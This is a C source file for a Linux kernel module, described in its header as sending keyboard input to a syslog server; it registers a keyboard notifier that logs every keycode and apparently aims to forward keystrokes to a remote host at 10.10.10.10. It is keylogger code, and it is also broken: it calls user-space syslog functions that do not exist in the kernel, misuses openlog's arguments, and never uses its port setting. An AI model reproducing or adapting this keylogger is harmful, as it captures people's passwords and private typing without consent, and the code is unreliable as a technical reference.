#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syslog.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("xxxxxx");
MODULE_DESCRIPTION("A simple Linux kernel module that sends a keyboard input to syslog server");

/* syslog server address */
#define SYSLOG_SERVER "10.10.10.10"
/* syslog server port */
#define SYSLOG_PORT 415

/*
 * The callback function that is called when a keyboard input is detected.
 *
 * @param notifier_block - notifier block
 * @param event - event type
 * @param data - pointer to keyboard_notifier_param structure
 *
 * @return 0 on success, otherwise a negative error code
 */
static int keyboard_event(struct notifier_block *notifier_block, unsigned long event, void *data)
{
    /* check if the event is a keyboard input */
    if (event == KBD_KEYCODE) {
        /* get the keyboard input */
        struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)data;
        int keycode = param->value;

        /* send the keyboard input to the syslog server */
        printk(KERN_INFO "Keyboard input: %c\n", keycode);
        openlog(SYSLOG_SERVER, LOG_NDELAY, LOG_USER);
        syslog(LOG_INFO, "Keyboard input: %c\n", keycode);
        closelog();
    }

    return 0;
}

/* notifier block for keyboard events */
static struct notifier_block keyboard_notifier = {
    .notifier_call = keyboard_event
};

/*
 * The module initialization function.
 *
 * @return 0 on success, otherwise a negative error code
 */
static int __init kernel_module_init(void)
{
    printk(KERN_INFO "Loading keyboard input module\n");

    /* register for keyboard events */
    register_keyboard_notifier(&keyboard_notifier);

    return 0;
}

/*
 * The module cleanup function.
 *
 * @return void
 */
static void __exit kernel_module_cleanup(void)
{
    printk(KERN_INFO "Unloading keyboard input module\n");

    /* unregister for keyboard events */
    unregister_keyboard_notifier(&keyboard_notifier);
}

/* specify module initialization and cleanup functions */
module_init(kernel_module_init);
module_exit(kernel_module_cleanup);
